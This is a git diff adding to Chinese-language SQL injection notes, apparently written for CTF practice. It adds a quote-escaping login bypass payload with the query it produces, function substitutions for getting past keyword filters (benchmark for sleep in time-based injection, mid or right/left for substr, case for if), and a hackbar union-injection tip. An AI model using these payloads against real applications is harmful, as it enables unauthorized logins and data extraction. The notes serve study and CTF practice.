@@ -475,9 +475,39 @@ MySQL中使用 REGEXP 操作符来进行正则表达式匹配
 select username from userinfo where password regexp'^123456$';
 ```
 
+##### 引号过滤
+
+例题
+
+```sql
+SELECT * FROM userinfo WHERE username="" and password=""
+```
+
+参数
+
+```
+username=\&password=||1#
+```
+
+该参数还原为
+
+```sql
+SELECT * FROM userinfo WHERE username="\" and password="||1#"
+```
+
+
+
 ##### 过滤函数绕过
 
-ascii('a') => ord('a')
+`ascii('a')` => `ord('a')`
+
+`sleep(3)` => `benchmark(1000000,md5(3))` (benchmark 设置得越大，延迟越大)
+
+`substr('abc',2,1)` => `mid('abc',2,1)`
+
+`substr('abc',2,1)` => `right(left('abc',2),1)`
+
+`if(1=2,3,4)` => `case 1 when 2 then 3 else 4 end`
 
 #### 万能密码表
 
@@ -604,6 +634,8 @@ print(base64.b64decode(flag))
 这段语句执行成功后可能没有任何提示（甚至提醒报错），自行访问 `/1.txt` 即可
 
 ##### 联合查询 (union)
+
+- 因为有过滤，建议使用 `hackbar` 自带的 sql 注入语句，需要输入两个参数，第一个是表有几列，第二个是前端显示在第几列 (需要提前自行测试)
 
 例子：
 
